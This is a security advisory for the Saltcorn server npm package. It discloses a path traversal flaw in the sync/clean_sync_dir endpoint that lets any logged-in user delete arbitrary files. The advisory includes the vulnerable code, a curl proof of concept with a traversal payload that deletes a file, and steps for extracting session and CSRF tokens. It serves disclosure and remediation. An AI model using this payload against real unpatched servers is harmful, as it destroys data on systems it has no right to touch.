# Logged-in users with any role can delete arbitrary files because of a path traversal vulnerability in `sync/clean\_sync\_dir` endpoint

Moderate

[glutamate](/glutamate)
published
GHSA-43f3-h63w-p6f6
Oct 6, 2024

## Package

npm

@saltcorn/server
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<=1.0.0-beta.15

## Patched versions

>=1.0.0-beta.16

## Description

### Summary

A logged-in user with any role can delete arbitrary files on the filesystem by calling the `sync/clean_sync_dir` endpoint. The `dir_name` POST parameter is not validated/sanitized and is used to construct the `syncDir` that is deleted by calling `fs.rm`.

### Details

* file: <https://github.com/saltcorn/saltcorn/blob/v1.0.0-beta.15/packages/server/routes/sync.js#L337-L346>

```
router.post(
  "/clean_sync_dir",
  error_catcher(async (req, res) => {
    const { dir_name } = req.body; // [1] source
    try {
      const rootFolder = await File.rootFolder();
      const syncDir = path.join(
        rootFolder.location,
        "mobile_app",
        "sync",
        dir_name // [2]
      );
      await fs.rm(syncDir, { recursive: true, force: true }); // [3] sink
      res.status(200).send("");
    } catch (error) {
      getState().log(2, `POST /sync/clean_sync_dir: '${error.message}'`);
      res.status(400).json({ error: error.message || error });
    }
  })
);
```
### PoC

The following PoC can be executed with a user with any role (`admin`, `staff`, `user`, `public`)

* create a file in a folder different from where the server is started:

```
touch /tmp/secret
cat /tmp/secret

```

* log with a user and retrieve valid `connect.sid` and `_csrf` values\*\*\*
* send the following `curl` request

```
curl -i -X $'POST' \
  -H $'Host: localhost:3000' \
  -H $'Content-Type: application/x-www-form-urlencoded' \
  -H $'Content-Length: 93' \
  -H $'Origin: http://localhost:3000' \
  -H $'Connection: close' \
  -b $'connect.sid=VALID_CONNECT_SID_COOKIE; loggedin=true' \
  --data-binary $'_csrf=VALID_CSRF_VALUE&dir_name=/../../../../../../../../../../tmp/secret' \
  $'http://localhost:3000/sync/clean_sync_dir'

```

* check if the file previously created does not exist anymore:

```
cat /tmp/secret
cat: /tmp/secret: No such file or directory

```

\*\*\* obtain `connect.sid` and `_csrf` values

A possible way to retrieve `connect.sid` and `_csrf` values is to use the password reset functionality:

* log in
* open the browser developer console, go to the `Network` tab filter for `settings` request
* visit `http://localhost:3000/auth/settings`
* trigger the change password functionality
* under the `Headers` and `Request` tabs, grab the `connect.sid` and `_csrf` values and replace them in the curl command

### Impact

Arbitrary file delete

### Recommended Mitigation

Resolve the `syncDir` and check if it starts with `rootFolder.location/mobile_app/sync`.

### Severity

Moderate

6.5

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
